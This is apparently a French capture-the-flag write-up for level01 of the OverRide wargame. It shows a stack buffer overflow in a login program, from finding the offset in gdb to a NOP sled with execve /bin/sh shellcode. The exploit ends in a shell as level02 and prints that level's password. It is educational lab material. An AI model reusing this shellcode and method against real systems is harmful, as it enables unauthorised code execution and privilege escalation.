# Level 01

Dans ce programme, on a deux variables, une pour le mot de passe et une pour le username.</br>
En premier lieu il va lire 256 caractères dans la variable username et vérifier que le username est égale à dat_wil.</br>
Si c'est le cas alors il va lire 100 caractères dans la variable pass, mais cette variable ne peut seulement contenir 16 caractères.

On va essayer d'overflow fgets pour récuperer l'offset jusqu'à EIP.
```
(gdb) r < <(echo "dat_wil";for x in {A..z}; do echo -n "$x$x$x$x"; done)
Starting program: /home/users/level01/level01 < <(echo "dat_wil"; for x in {A..z}; do echo -n "$x$x$x$x"; done)
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()


$ python
>>> bytes.fromhex("55").decode("ASCII")
'U'
>>> (ord('U') - ord('A')) * 4
80
```
Maintenant qu'on a notre offset, on va pouvoir faire un NOP sled avec un shellcode, en mettant l'adresse de notre NOP sled dans saved EIP.
```
level01@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
level01@OverRide:~$ gdb ./level01
(gdb) b main
Breakpoint 1 at 0x80484d5
(gdb) r
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d5 in main ()
(gdb) x/200x $esp
0xffffd690:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513
0xffffd6a0:	0x00000001	0xffffd734	0xffffd73c	0xf7fd3000
0xffffd6b0:	0x00000000	0xffffd71c	0xffffd73c	0x00000000
0xffffd6c0:	0x08048250	0xf7fceff4	0x00000000	0x00000000
0xffffd6d0:	0x00000000	0xd80bbdce	0xef0f59de	0x00000000
0xffffd6e0:	0x00000000	0x00000000	0x00000001	0x080483b0
0xffffd6f0:	0x00000000	0xf7ff0a50	0xf7e45429	0xf7ffcff4
0xffffd700:	0x00000001	0x080483b0	0x00000000	0x080483d1
0xffffd710:	0x080484d0	0x00000001	0xffffd734	0x080485c0
0xffffd720:	0x08048630	0xf7feb620	0xffffd72c	0xf7ffd918
0xffffd730:	0x00000001	0xffffd854	0x00000000	0xffffd870
0xffffd740:	0xffffd8f6	0xffffd90a	0xffffd91a	0xffffd939
0xffffd750:	0xffffd94c	0xffffd959	0xffffde7a	0xffffde85
0xffffd760:	0xffffde9c	0xffffdee9	0xffffdef8	0xffffdf10
0xffffd770:	0xffffdf21	0xffffdf2a	0xffffdf32	0xffffdf4b
0xffffd780:	0xffffdf5d	0xffffdf6d	0xffffdf9a	0xffffdfba
0xffffd790:	0x00000000	0x00000020	0xf7fdb430	0x00000021
0xffffd7a0:	0xf7fdb000	0x00000010	0x178bfbff	0x00000006
0xffffd7b0:	0x00001000	0x00000011	0x00000064	0x00000003
0xffffd7c0:	0x08048034	0x00000004	0x00000020	0x00000005
0xffffd7d0:	0x00000009	0x00000007	0xf7fdc000	0x00000008
0xffffd7e0:	0x00000000	0x00000009	0x080483b0	0x0000000b
0xffffd7f0:	0x000003e9	0x0000000c	0x000003e9	0x0000000d
0xffffd800:	0x000003e9	0x0000000e	0x000003e9	0x00000017
0xffffd810:	0x00000000	0x00000019	0xffffd83b	0x0000001f
0xffffd820:	0xffffdfdc	0x0000000f	0xffffd84b	0x00000000
0xffffd830:	0x00000000	0x00000000	0x88000000	0x7e0b14a9
0xffffd840:	0x8c1893d3	0xa2047e38	0x69702cbb	0x00363836
0xffffd850:	0x00000000	0x6d6f682f	0x73752f65	0x2f737265
0xffffd860:	0x6576656c	0x2f31306c	0x6576656c	0x0031306c
0xffffd870:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xffffd880:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd890:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8d0:	0x90909090	0x90909090	0x90909090	0xc0319090
0xffffd8e0:	0x2f2f6850	0x2f686873	0x896e6962	0x895350e3
0xffffd8f0:	0xcd0bb0e1	0x45540080	0x783d4d52	0x6d726574
0xffffd900:	0x3635322d	0x6f6c6f63	0x48530072	0x3d4c4c45
0xffffd910:	0x6e69622f	0x7361622f	0x53530068	0x4c435f48
0xffffd920:	0x544e4549	0x2e30313d	0x2e322e30	0x33332032
0xffffd930:	0x20343430	0x32343234	0x48535300	0x5954545f
0xffffd940:	0x65642f3d	0x74702f76	0x00302f73	0x52455355
0xffffd950:	0x76656c3d	0x31306c65	0x5f534c00	0x4f4c4f43
```
Dans cette liste d'hexa on va chercher nos NOP (0x90 en hexa) et prendre une adresse à peu près au milieu. (0xffffd8d0)
```
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "B" * 80 + "\xd0\xd8\xff\xff"'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat ~level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
